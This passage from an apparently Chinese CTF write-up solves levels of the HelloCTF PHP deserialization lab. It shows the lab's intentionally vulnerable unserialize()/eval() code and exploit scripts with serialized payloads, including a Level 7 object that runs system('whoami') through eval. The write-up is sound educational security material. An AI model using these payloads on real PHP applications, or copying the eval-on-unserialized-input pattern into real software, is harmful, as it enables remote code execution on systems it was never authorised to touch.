class="line"><span class="comment">HINT：各有千秋~</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a_class</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a_value</span> = <span class="string">&quot;HelloCTF&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a_object</span> = <span class="keyword">new</span> <span class="title function_ invoke__">a_class</span>();</span><br><span class="line"><span class="variable">$a_array</span> = <span class="keyword">array</span>(a=&gt;<span class="string">&quot;Hello&quot;</span>,b=&gt;<span class="string">&quot;CTF&quot;</span>);</span><br><span class="line"><span class="variable">$a_string</span> = <span class="string">&quot;HelloCTF&quot;</span>;</span><br><span class="line"><span class="variable">$a_number</span> = <span class="number">678470</span>;</span><br><span class="line"><span class="variable">$a_boolean</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$a_null</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">See How to serialize:</span></span><br><span class="line"><span class="comment">a_object: O:7:&quot;a_class&quot;:1:&#123;s:7:&quot;a_value&quot;;s:8:&quot;HelloCTF&quot;;&#125;</span></span><br><span class="line"><span class="comment">a_array: a:2:&#123;s:1:&quot;a&quot;;s:5:&quot;Hello&quot;;s:1:&quot;b&quot;;s:3:&quot;CTF&quot;;&#125;</span></span><br><span class="line"><span class="comment">a_string: s:8:&quot;HelloCTF&quot;;</span></span><br><span class="line"><span class="comment">a_number: i:678470;</span></span><br><span class="line"><span class="comment">a_boolean: b:1;</span></span><br><span class="line"><span class="comment">a_null: N;</span></span><br><span class="line"><span class="comment">Now your turn!</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$your_object</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]);</span><br><span class="line"><span class="variable">$your_array</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="variable">$your_string</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;s&#x27;</span>]);</span><br><span class="line"><span class="variable">$your_number</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;i&#x27;</span>]);</span><br><span class="line"><span class="variable">$your_boolean</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="variable">$your_NULL</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;n&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(</span><br><span class="line">    <span class="variable">$your_boolean</span> &amp;&amp; </span><br><span class="line">    <span class="variable">$your_NULL</span> == <span class="literal">null</span> &amp;&amp;</span><br><span class="line">    <span class="variable">$your_string</span> == <span class="string">&quot;IWANT&quot;</span> &amp;&amp;</span><br><span class="line">    <span class="variable">$your_number</span> == <span class="number">1</span> &amp;&amp;</span><br><span class="line">    <span class="variable">$your_object</span>-&gt;a_value == <span class="string">&quot;FLAG&quot;</span> &amp;&amp;</span><br><span class="line">    <span class="variable">$your_array</span>[<span class="string">&#x27;a&#x27;</span>] == <span class="string">&quot;Plz&quot;</span> &amp;&amp; <span class="variable">$your_array</span>[<span class="string">&#x27;b&#x27;</span>] == <span class="string">&quot;Give_M3&quot;</span></span><br><span class="line">)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You really know how to serialize?&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//You really know how to serialize?</span></span><br></pre></td></tr></table></figure>

<p>就是简单介绍了序列化与反序列化的样子，exp 如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a_class</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a_value</span> = <span class="string">&quot;FLAG&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$your_boolean</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$your_NULL</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$your_string</span> = <span class="string">&quot;IWANT&quot;</span>;</span><br><span class="line"><span class="variable">$your_number</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$your_array</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span> =&gt; <span class="string">&quot;Plz&quot;</span>, <span class="string">&#x27;b&#x27;</span> =&gt; <span class="string">&quot;Give_M3&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$exp</span> = <span class="string">&quot;o=&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">a_class</span>()).<span class="string">&quot;&amp;s=&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$your_string</span>).<span class="string">&quot;&amp;a=&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$your_array</span>).<span class="string">&quot;&amp;i=&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$your_number</span>).<span class="string">&quot;&amp;b=&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$your_boolean</span>).<span class="string">&quot;&amp;n=&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$your_NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$exp</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出：o=O:7:&quot;a_class&quot;:1:&#123;s:7:&quot;a_value&quot;;s:4:&quot;FLAG&quot;;&#125;&amp;s=s:5:&quot;IWANT&quot;;&amp;a=a:2:&#123;s:1:&quot;a&quot;;s:3:&quot;Plz&quot;;s:1:&quot;b&quot;;s:7:&quot;Give_M3&quot;;&#125;&amp;i=i:1;&amp;b=b:1;&amp;n=N;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1754799513737-d20c7000-45b2-4066-963b-75feee2dfe43.png"></p>
<h1 id="Level-6-序列化规则-权限修饰"><a href="#Level-6-序列化规则-权限修饰" class="headerlink" title="Level-6 : 序列化规则_权限修饰"></a>Level-6 : 序列化规则_权限修饰</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 6 : 序列化规则_权限修饰 --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">HINT：各有千秋~特别注意的权限修饰符x</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">protectedKEY</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$protected_key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_key</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;protected_key;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">privateKEY</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$private_key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_key</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;private_key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">See Carfully~</span></span><br><span class="line"><span class="comment">protected&#x27;s serialize: O%3A12%3A%22protectedKEY%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00protected_key%22%3BN%3B%7D</span></span><br><span class="line"><span class="comment">private&#x27;s serialize: O%3A10%3A%22privateKEY%22%3A1%3A%7Bs%3A23%3A%22%00privateKEY%00private_key%22%3BN%3B%7D</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$protected_key</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;protected_key&#x27;</span>]);</span><br><span class="line"><span class="variable">$private_key</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;private_key&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$protected_key</span>)&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$private_key</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$protected_key</span>-&gt;<span class="title function_ invoke__">get_key</span>() == <span class="string">&quot;protected_key&quot;</span> &amp;&amp; <span class="variable">$private_key</span>-&gt;<span class="title function_ invoke__">get_key</span>() == <span class="string">&quot;private_key&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;We Call it %00_Contr0l_Characters_NULL!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>题目给了好几个%00</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">See Carfully~</span><br><span class="line">protected&#x27;s serialize: O%3A12%3A%22protectedKEY%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00protected_key%22%3BN%3B%7D</span><br><span class="line">private&#x27;s serialize: O%3A10%3A%22privateKEY%22%3A1%3A%7Bs%3A23%3A%22%00privateKEY%00private_key%22%3BN%3B%7D</span><br></pre></td></tr></table></figure>

<p>exp 就是直接在类中进行赋值就行了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">protectedKEY</span></span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$protected_key</span> = <span class="string">&quot;protected_key&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">get_key</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;protected_key;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">privateKEY</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$private_key</span> = <span class="string">&quot;private_key&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">get_key</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;private_key;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">privateKEY</span>()).<span class="string">&quot;\n&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">protectedKEY</span>());</span><br></pre></td></tr></table></figure>

<p>我们发现 exp 的运行结果中有几个不可见字符，这就是 %00，题目也说了“ <font style="color:rgb(221, 0, 0);">We Call it %00_Contr0l_Characters_NULL!</font> ”，%00 代表了这个不可见字符 NULL。 复制的时候并不会把这个不可见字符加进去，直接就是把 %00 去掉了，需要注意手动加上去！</p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1754808539080-ce29cbf4-a2fd-4b2f-8801-18fc378727ce.png"></p>
<p>playload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">private_key=O:10:&quot;privateKEY&quot;:1:&#123;s:23:&quot;%00privateKEY%00private_key&quot;;s:11:&quot;private_key&quot;;&#125;</span><br><span class="line">&amp;protected_key=O:12:&quot;protectedKEY&quot;:1:&#123;s:16:&quot;%00*%00protected_key&quot;;s:13:&quot;protected_key&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1754808199519-d8bd428b-404f-454b-aed5-5e0fda2a0d6f.png"></p>
<h1 id="Level-7-实例化和反序列化"><a href="#Level-7-实例化和反序列化" class="headerlink" title="Level-7 : 实例化和反序列化"></a>Level-7 : 实例化和反序列化</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 7 : 实例化和反序列化 --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">HINT：可控的输入 简单的漏洞演示 / FLAG in flag.php</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag_command</span> = <span class="string">&quot;echo &#x27;Hello CTF!&lt;br&gt;&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">backdoor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;flag_command);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$unserialize_string</span> = <span class="string">&#x27;O:4:&quot;FLAG&quot;:1:&#123;s:12:&quot;flag_command&quot;;s:24:&quot;echo &#x27;</span>Hello World!&lt;br&gt;<span class="string">&#x27;;&quot;;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$Instantiate_object</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>(); <span class="comment">// 实例化的对象</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$Unserialize_object</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$unserialize_string</span>); <span class="comment">// 反序列化的对象</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$Instantiate_object</span>-&gt;<span class="title function_ invoke__">backdoor</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$Unserialize_object</span>-&gt;<span class="title function_ invoke__">backdoor</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">&#x27;$Instantiate_object-&gt;backdoor()&#x27; will output:Hello CTF!</span></span><br><span class="line"><span class="comment">&#x27;$Unserialize_object-&gt;backdoor()&#x27; will output:Hello World!</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="comment">/* Now Your Turn */</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>])-&gt;<span class="title function_ invoke__">backdoor</span>();</span><br></pre></td></tr></table></figure>

<p>从给出的实例来看，本来类的代码是想要输出”Hello CTF!“，但是序列化的代码时想要输出“ Hello World!“。通过实验可以发现实例化的对象调用 backdoor() 函数时输出的是”Hello CTF!“，序列化的代码在经过反序列化后再调用 backdoor() 函数时确输出了“ Hello World!“这个不应该输出的字符串。题目中的 $unserialize_string 是固定的，如果是 user 可控的输入就可以进行 rce 了，这是非常可怕的。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag_command</span> = <span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>());</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1754809772348-c2ba804b-3bf0-46a1-bb5c-d58a74a2c852.png"></p>
<p>读取 flag</p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1754810599407-e50e306a-a04a-4a1f-a49a-0358e9de5a96.png"></p>
<h1 id="Level-8-构造函数和析构函数以及GC机制"><a href="#Level-8-构造函数和析构函数以及GC机制" class="headerlink" title="Level-8 : 构造函数和析构函数以及GC机制"></a>Level-8 : 构造函数和析构函数以及GC机制</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 8 : 构造函数和析构函数 --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">HINT：注意顺序和次数</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> <span class="variable">$destruct_flag</span>;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$construct_flag</span>;</span><br><span class="line"><span class="variable">$destruct_flag</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$construct_flag</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class_name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$class_name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;class_name = <span class="variable">$class_name</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$construct_flag</span>;</span><br><span class="line">        <span class="variable">$construct_flag</span>++;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Constructor called &quot;</span> . <span class="variable">$construct_flag</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$destruct_flag</span>;</span><br><span class="line">        <span class="variable">$destruct_flag</span>++;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Destructor called &quot;</span> . <span class="variable">$destruct_flag</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Object created*/</span></span><br><span class="line"><span class="variable">$demo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>(<span class="string">&#x27;demo&#x27;</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">/*Object serialized*/</span></span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$demo</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Object unserialized*/</span></span><br><span class="line"><span class="variable">$n</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$s</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">/*unserialized object destroyed*/</span></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$n</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*original object destroyed*/</span></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$demo</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*注意 此处为了方便演示为手动释放，一般情况下，当脚本运行完毕后，php会将未显式销毁的对象自动销毁，该行为也会调用析构函数*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*此外 还有比较特殊的情况: PHP的GC(垃圾回收机制)会在脚本运行时自动管理内存，销毁不被引用的对象:*/</span></span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Object created:Constructor called 1</span></span><br><span class="line"><span class="comment">Object serialized: But Nothing Happen(:</span></span><br><span class="line"><span class="comment">Object unserialized:But nothing happened either):</span></span><br><span class="line"><span class="comment">serialized Object destroyed:Destructor called 1</span></span><br><span class="line"><span class="comment">original Object destroyed:Destructor called 2</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This object (&#x27;new FLAG();&#x27;) will be destroyed immediately because it is not assigned to any variable:Constructor called 2</span></span><br><span class="line"><span class="comment">Destructor called 3</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//Now Your Turn!, Try to get the flag!</span></span><br><span class="line"><span 